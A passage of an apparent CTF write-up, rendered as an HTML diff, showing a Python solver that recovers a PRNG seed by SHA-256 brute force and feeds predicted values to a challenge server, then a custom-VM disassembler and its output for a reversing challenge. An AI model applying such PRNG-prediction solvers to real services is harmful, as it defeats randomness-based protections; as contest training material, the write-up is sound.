+r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+ininum <span style="color:#f92672">=</span> int(findall(<span style="color:#e6db74">&#39;\d+&#39;</span>,str(r<span style="color:#f92672">.</span>recv()))[<span style="color:#ae81ff">0</span>])<span style="color:#960050;background-color:#1e0010">​</span>
+print(ininum)<span style="color:#960050;background-color:#1e0010">​</span>
+xlow <span style="color:#f92672">=</span> hex(ininum)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[<span style="color:#ae81ff">4</span>:]<span style="color:#960050;background-color:#1e0010">​</span>
+thash <span style="color:#f92672">=</span> hex(ininum)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[:<span style="color:#ae81ff">4</span>]<span style="color:#960050;background-color:#1e0010">​</span>
+pos2 <span style="color:#f92672">=</span> []<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0xfffff</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    x <span style="color:#f92672">=</span> int(hex(i)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> xlow,<span style="color:#ae81ff">16</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    allhash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(x)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> allhash[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> thash:<span style="color:#960050;background-color:#1e0010">​</span>
+        pos2<span style="color:#f92672">.</span>append(x)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+print(pos2)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> pos1:<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> (i<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">//</span> <span style="color:#ae81ff">100</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">10000000000</span> <span style="color:#f92672">in</span> pos2:<span style="color:#960050;background-color:#1e0010">​</span>
+        inix <span style="color:#f92672">=</span> i<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">break</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+print(inix)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+res <span style="color:#f92672">=</span> []<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    inix,result <span style="color:#f92672">=</span> next(inix)<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        res<span style="color:#f92672">.</span>append(result)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">98</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    r<span style="color:#f92672">.</span>sendline(str(res[i])<span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+    print(r<span style="color:#f92672">.</span>recv())
+</code></pre></div><h2 id="reverse">Reverse</h2>
+<h3 id="indir">Indir</h3>
+<p>通过给的附件，加上分析发现是虚拟机，有一大堆跳转混淆，将寄存器跳转改为真实地址跳转，main函数如下​
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 176; 
+			flex-basis: 424px"
+	>
+	<a href="/post/qwnt-writeup-by-or4nge/re1.png" data-size="1280x724">
+		<img src="/post/qwnt-writeup-by-or4nge/re1.png"
+			width="1280"
+			height="724"
+			srcset="/post/qwnt-writeup-by-or4nge/re1_hueaf2c52cb0b1851cf6925aeda5015444_463653_480x0_resize_box_3.png 480w, /post/qwnt-writeup-by-or4nge/re1_hueaf2c52cb0b1851cf6925aeda5015444_463653_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure>
+虚拟机解析过程在sub_402780​
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 199; 
+			flex-basis: 478px"
+	>
+	<a href="/post/qwnt-writeup-by-or4nge/re2.png" data-size="1280x642">
+		<img src="/post/qwnt-writeup-by-or4nge/re2.png"
+			width="1280"
+			height="642"
+			srcset="/post/qwnt-writeup-by-or4nge/re2_hu93dacdd4e8d2ae1ee86a6aab5ca709ca_538949_480x0_resize_box_3.png 480w, /post/qwnt-writeup-by-or4nge/re2_hu93dacdd4e8d2ae1ee86a6aab5ca709ca_538949_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure>
+分析写出反汇编器​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ctx<span style="color:#f92672">=</span>open(<span style="color:#e6db74">&#39;code&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># for i in range(0,0x35c,4):​</span>
+<span style="color:#75715e">#     instr=int.from_bytes(ctx[i:i+4],&#39;little&#39;)​</span>
+<span style="color:#75715e">#     datatype=(instr&gt;&gt;22)&amp;7​</span>
+<span style="color:#75715e">#     if datatype!=6 and datatype!=5 and datatype!=3:​</span>
+<span style="color:#75715e">#         print(i,datatype)​</span>
+disasm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x35c</span>,<span style="color:#ae81ff">4</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    instr<span style="color:#f92672">=</span>int<span style="color:#f92672">.</span>from_bytes(ctx[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>],<span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    mnemonic<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">25</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xf</span><span style="color:#960050;background-color:#1e0010">​</span>
+    datatype<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">22</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+    opstr<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    disasm<span style="color:#f92672">+=</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;:   &#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;ror&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;ld&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">2</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;io&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">3</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;sub&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;mod&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">5</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;div&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">6</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;mov&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">7</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;rsh&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">8</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;st&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">9</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;ret&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;lsh&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">11</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;add&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">12</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;mul&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">13</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;call&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">14</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;rol&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> mnemonic<span style="color:#f92672">==</span><span style="color:#ae81ff">15</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;jmp&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> mnemonic<span style="color:#f92672">!=</span><span style="color:#ae81ff">13</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> datatype<span style="color:#f92672">==</span><span style="color:#ae81ff">3</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        imm<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+        opstr<span style="color:#f92672">=</span>str(imm)<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> datatype<span style="color:#f92672">==</span><span style="color:#ae81ff">5</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        r1<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">19</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+        imm<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+        r2<span style="color:#f92672">=</span>(instr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+        opstr<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;r&#39;</span><span style="color:#f92672">+</span>str(r1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">+</span>str(imm)<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> datatype<span style="color:#f92672">==</span><span style="color:#ae81ff">6</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        r1<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">19</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+        r2<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+        imm<span style="color:#f92672">=</span>(instr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+        opstr<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;r&#39;</span><span style="color:#f92672">+</span>str(r1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,r&#39;</span><span style="color:#f92672">+</span>str(r2)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">+</span>str(imm)<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">elif</span> datatype<span style="color:#f92672">==</span><span style="color:#ae81ff">7</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        r1<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">19</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+        r2<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+        r3<span style="color:#f92672">=</span>(instr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">13</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+        opstr<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;r&#39;</span><span style="color:#f92672">+</span>str(r1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,r&#39;</span><span style="color:#f92672">+</span>str(r2)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,r&#39;</span><span style="color:#f92672">+</span>str(r3)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+    disasm<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>opstr<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+open(<span style="color:#e6db74">&#39;disas&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(disasm)
+</code></pre></div><p>得到反汇编代码，分析即可得解​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0:</span>   <span style="color:#a6e22e">mov</span>        <span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">860</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">4:</span>   <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">740</span>                   <span style="color:#75715e">#输出​
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">8</span>:   <span style="color:#66d9ef">mov</span>        <span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">4096</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">12:</span>   <span style="color:#a6e22e">call</span>  <span style="color:#ae81ff">692</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">16:</span>   <span style="color:#a6e22e">mov</span>       <span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">4096</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">20:</span>   <span style="color:#a6e22e">mov</span>       <span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">24:</span>   <span style="color:#a6e22e">mul</span>       <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">28:</span>   <span style="color:#a6e22e">ld</span>        <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">32:</span>   <span style="color:#a6e22e">add</span>       <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">36:</span>   <span style="color:#a6e22e">mod</span>       <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">40:</span>   <span style="color:#a6e22e">mul</span>       <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">44:</span>   <span style="color:#a6e22e">ld</span>        <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">48:</span>   <span style="color:#a6e22e">ror</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">52:</span>   <span style="color:#a6e22e">sub</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">56:</span>   <span style="color:#a6e22e">st</span>        <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">60:</span>   <span style="color:#a6e22e">add</span>       <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">64:</span>   <span style="color:#a6e22e">mul</span>       <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">68:</span>   <span style="color:#a6e22e">ld</span>        <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">72:</span>   <span style="color:#a6e22e">add</span>       <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">76:</span>   <span style="color:#a6e22e">mod</span>       <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">80:</span>   <span style="color:#a6e22e">mul</span>       <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">84:</span>   <span style="color:#a6e22e">ld</span>        <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">88:</span>   <span style="color:#a6e22e">rol</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">92:</span>   <span style="color:#a6e22e">add</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">96:</span>   <span style="color:#a6e22e">st</span>        <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">100:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">104:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">108:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">112:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">116:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">120:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">124:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">128:</span>   <span style="color:#a6e22e">rol</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">132:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">136:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">140:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">144:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">148:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">152:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">156:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">160:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">164:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">168:</span>   <span style="color:#a6e22e">rol</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">172:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">176:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">180:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">184:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">188:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
